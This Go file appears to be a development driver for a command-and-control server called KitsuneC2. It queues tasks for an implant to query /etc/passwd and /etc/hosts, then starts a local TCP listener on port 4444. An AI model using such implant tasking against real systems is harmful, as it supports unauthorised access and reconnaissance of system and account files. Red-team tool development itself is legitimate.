package main

import (
	"KitsuneC2/lib/communication"
	"KitsuneC2/server/api"
	"KitsuneC2/server/db"
	"KitsuneC2/server/listener"
	"fmt"
	"time"
)

func main() {

	db.Init()
	var t1 communication.Task = &communication.FileInfoReq{PathToFile: "/etc/passwd"}
	var t2 communication.Task = &communication.FileInfoReq{PathToFile: "/etc/hosts"}
	err := api.AddTaskForImplant("7487150c432c0d8fafc96e2b2d8aad88", 11, &t1)
	if err != nil {
		fmt.Println(err)
	}
	err = api.AddTaskForImplant("7487150c432c0d8fafc96e2b2d8aad88", 11, &t2)
	if err != nil {
		fmt.Println(err)
	}
	l1 := listener.Listener{Type: "tcp", Handler: tcpHandler, Network: "127.0.0.1", Port: 4444}
	l1.Start()
	time.Sleep(time.Minute * 10)

	db.Shutdown()

}
